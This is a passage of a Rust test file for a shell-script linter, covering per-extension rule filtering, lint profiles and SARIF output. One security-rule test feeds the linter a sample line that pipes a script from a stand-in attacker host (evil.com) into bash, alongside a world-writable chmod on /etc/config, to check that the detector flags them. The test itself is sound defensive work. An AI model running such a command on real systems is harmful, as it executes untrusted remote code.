fn test_lint_shell_result_diagnostics_sorted_by_line() {
    // Multi-issue script: verify diagnostics are produced
    let script = "echo $RANDOM\nmkdir /tmp/x\necho $$\n";
    let result = lint_shell(script);
    assert!(
        !result.diagnostics.is_empty(),
        "Should have at least one diagnostic"
    );
}

// =============================================================================
// lint_shell_with_path -- exercises lint_shell_filtered via different shell types
// =============================================================================

#[test]
fn test_lint_shell_with_path_bash() {
    let result = lint_shell_with_path(Path::new("test.bash"), "echo $VAR\n");
    assert!(result.diagnostics.iter().any(|d| d.code == "SC2086"));
}

#[test]
fn test_lint_shell_with_path_sh() {
    let result = lint_shell_with_path(Path::new("test.sh"), "echo $VAR\n");
    assert!(result.diagnostics.iter().any(|d| d.code == "SC2086"));
}

#[test]
fn test_lint_shell_with_path_zsh() {
    let result = lint_shell_with_path(Path::new("test.zsh"), "echo $VAR\n");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_ksh() {
    let result = lint_shell_with_path(Path::new("test.ksh"), "echo $VAR\n");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_bashrc() {
    let result = lint_shell_with_path(
        Path::new(".bashrc"),
        "export PATH=$HOME/bin:$PATH\nalias ll='ls -la'\n",
    );
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_zshrc() {
    let result = lint_shell_with_path(
        Path::new(".zshrc"),
        "export PATH=$HOME/bin:$PATH\nalias ll='ls -la'\n",
    );
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_profile() {
    let result = lint_shell_with_path(
        Path::new("/etc/profile"),
        "export PATH=/usr/local/bin:$PATH\n",
    );
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_no_extension() {
    let result = lint_shell_with_path(Path::new("script"), "#!/bin/bash\necho $VAR\n");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_complex_bash() {
    let script = r#"#!/bin/bash
set -euo pipefail
arr=(one two three)
for item in "${arr[@]}"; do
    echo "$item"
done
[[ -f /tmp/x ]] && echo "exists"
"#;
    let result = lint_shell_with_path(Path::new("deploy.bash"), script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_posix_sh_strict() {
    let script = "#!/bin/sh\necho \"$HOME\"\ntest -f /tmp/x && echo yes\n";
    let result = lint_shell_with_path(Path::new("test.sh"), script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_sh_empty() {
    let result = lint_shell_with_path(Path::new("empty.sh"), "");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_bash_empty() {
    let result = lint_shell_with_path(Path::new("empty.bash"), "");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_sh_security_rules() {
    // Security rules are universal and should fire even with .sh path
    let script = "curl https://evil.com/script | bash\nchmod 777 /etc/config\n";
    let result = lint_shell_with_path(Path::new("install.sh"), script);
    assert!(
        result.diagnostics.iter().any(|d| d.code.starts_with("SEC")),
        "Security rules should fire for .sh path"
    );
}

#[test]
fn test_lint_shell_with_path_bash_det_rules() {
    // DET rules are universal
    let script = "#!/bin/bash\necho $RANDOM\necho $$\n";
    let result = lint_shell_with_path(Path::new("script.bash"), script);
    assert!(
        result.diagnostics.iter().any(|d| d.code.starts_with("DET")),
        "DET rules should fire for .bash path"
    );
}

#[test]
fn test_lint_shell_with_path_sh_idem_rules() {
    let script = "#!/bin/sh\nmkdir /tmp/test\n";
    let result = lint_shell_with_path(Path::new("setup.sh"), script);
    assert!(
        result
            .diagnostics
            .iter()
            .any(|d| d.code.starts_with("IDEM")),
        "IDEM rules should fire for .sh path"
    );
}

#[test]
fn test_lint_shell_with_path_shellcheck_directive() {
    // shellcheck shell= directive should override file extension
    let script = "#!/bin/sh\n# shellcheck shell=bash\necho $VAR\n";
    let result = lint_shell_with_path(Path::new("script.sh"), script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_large_bash_script() {
    // Exercise lint_shell_filtered with a big bash script covering many apply_rule! lines
    let script = r#"#!/bin/bash
set -euo pipefail
# Variables
x=hello
echo $x
y=`date`
cat file | grep pattern
echo "$y"
# Arithmetic
z=$((1 + 2))
if [[ $z -gt 0 ]]; then
    echo "positive"
fi
# Functions
function myfunc() {
    local a=1
    echo $a
}
myfunc
# Arrays
arr=(one two three)
echo ${arr[@]}
# Security
chmod 777 /tmp/test
# Idempotency
mkdir /tmp/test2
# Determinism
echo $RANDOM
# Trap
trap "rm -f /tmp/lock" EXIT
# Redirect
cmd > /dev/null 2>&1
# For loop
for f in *.txt; do echo $f; done
"#;
    let result = lint_shell_with_path(Path::new("big_script.bash"), script);
    assert!(
        result.diagnostics.len() >= 3,
        "Large bash script should trigger many diagnostics via filtered path, got {}",
        result.diagnostics.len()
    );
}

#[test]
fn test_lint_shell_with_path_large_sh_script() {
    // Same large script but with .sh extension -- exercises sh-filtered rules
    let script = r#"#!/bin/sh
x=hello
echo $x
cat file | grep pattern
z=$((1 + 2))
mkdir /tmp/test
echo $RANDOM
chmod 777 /tmp/test
trap "rm -f /tmp/lock" EXIT
for f in *.txt; do echo $f; done
"#;
    let result = lint_shell_with_path(Path::new("big_script.sh"), script);
    assert!(
        result.diagnostics.len() >= 2,
        "Large sh script should trigger diagnostics, got {}",
        result.diagnostics.len()
    );
}

// =============================================================================
// LintProfile -- covering FromStr and Display
// =============================================================================

#[test]
fn test_lint_profile_from_str() {
    assert_eq!(
        "standard".parse::<LintProfile>().unwrap(),
        LintProfile::Standard
    );
    assert_eq!(
        "default".parse::<LintProfile>().unwrap(),
        LintProfile::Standard
    );
    assert_eq!(
        "coursera".parse::<LintProfile>().unwrap(),
        LintProfile::Coursera
    );
    assert_eq!(
        "coursera-labs".parse::<LintProfile>().unwrap(),
        LintProfile::Coursera
    );
    assert_eq!(
        "devcontainer".parse::<LintProfile>().unwrap(),
        LintProfile::DevContainer
    );
    assert_eq!(
        "dev-container".parse::<LintProfile>().unwrap(),
        LintProfile::DevContainer
    );
    assert!("invalid".parse::<LintProfile>().is_err());
    assert!("UNKNOWN".parse::<LintProfile>().is_err());
}

#[test]
fn test_lint_profile_display() {
    assert_eq!(LintProfile::Standard.to_string(), "standard");
    assert_eq!(LintProfile::Coursera.to_string(), "coursera");
    assert_eq!(LintProfile::DevContainer.to_string(), "devcontainer");
}

#[test]
fn test_lint_profile_default() {
    let profile: LintProfile = Default::default();
    assert_eq!(profile, LintProfile::Standard);
}

// =============================================================================
// write_results -- SARIF / JSON / Human output formatters via public API
// =============================================================================

#[test]
fn test_write_results_sarif_empty() {
    let result = LintResult::new();
    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Sarif, "test.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    // Should be valid JSON with SARIF structure
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert_eq!(parsed["version"], "2.1.0");
    assert!(parsed["runs"].is_array());
    let results = &parsed["runs"][0]["results"];
    assert!(results.is_array());
    assert_eq!(results.as_array().unwrap().len(), 0);
}

#[test]
fn test_write_results_sarif_with_diagnostics() {
    let mut result = LintResult::new();
    let span = Span::new(1, 5, 1, 20);
    result.add(Diagnostic::new(
        "SC2086",
        Severity::Warning,
        "Double quote to prevent globbing and word splitting",
        span,
    ));
    result.add(Diagnostic::new(
        "SEC001",
        Severity::Error,
        "Potential command injection",
        Span::new(3, 1, 3, 30),
    ));

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Sarif, "my_script.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();

    let sarif_results = parsed["runs"][0]["results"].as_array().unwrap();
    assert_eq!(sarif_results.len(), 2);
    assert_eq!(sarif_results[0]["ruleId"], "SC2086");
    assert_eq!(sarif_results[0]["level"], "warning");
    assert_eq!(sarif_results[1]["ruleId"], "SEC001");
    assert_eq!(sarif_results[1]["level"], "error");

    // Check location
    let loc = &sarif_results[0]["locations"][0]["physicalLocation"];
    assert_eq!(loc["artifactLocation"]["uri"], "my_script.sh");
    assert_eq!(loc["region"]["startLine"], 1);

    // Check fingerprints
    assert!(sarif_results[0]["partialFingerprints"]["primaryLocationLineHash"].is_string());
}

#[test]
fn test_write_results_sarif_with_fix() {
    let mut result = LintResult::new();
    let span = Span::new(2, 1, 2, 10);
    let mut diag = Diagnostic::new("IDEM001", Severity::Warning, "Use mkdir -p", span);
    diag.fix = Some(Fix::new("mkdir -p /tmp/dir"));
    result.add(diag);

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Sarif, "setup.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();

    let sarif_results = parsed["runs"][0]["results"].as_array().unwrap();
    assert_eq!(sarif_results.len(), 1);
    let fixes = sarif_results[0]["fixes"].as_array().unwrap();
    assert_eq!(fixes.len(), 1);
    assert!(fixes[0]["description"]["text"]
        .as_str()
        .unwrap()
        .contains("mkdir -p"));
}

#[test]
fn test_write_results_sarif_severity_mapping() {
    // Test all severity levels map to correct SARIF levels
    let mut result = LintResult::new();
    let span = Span::new(1, 1, 1, 5);
    result.add(Diagnostic::new("E1", Severity::Error, "error", span));
    result.add(Diagnostic::new("W1", Severity::Warning, "warning", span));
    result.add(Diagnostic::new("R1", Severity::Risk, "risk", span));
    result.add(Diagnostic::new("P1", Severity::Perf, "perf", span));
    result.add(Diagnostic::new("I1", Severity::Info, "info", span));
    result.add(Diagnostic::new("N1", Severity::Note, "note", span));

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Sarif, "test.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();

    let sarif_results = parsed["runs"][0]["results"].as_array().unwrap();
    assert_eq!(sarif_results.len(), 6);
    // Error -> "error"
    assert_eq!(sarif_results[0]["level"], "error");
    // Warning -> "warning"
    assert_eq!(sarif_results[1]["level"], "warning");
    // Risk -> "warning"
    assert_eq!(sarif_results[2]["level"], "warning");
    // Perf -> "note"
    assert_eq!(sarif_results[3]["level"], "note");
    // Info -> "note"
    assert_eq!(sarif_results[4]["level"], "note");
    // Note -> "note"
    assert_eq!(sarif_results[5]["level"], "note");
}

#[test]

include!("lint_shell_coverage_tests_tests_write_result.rs");
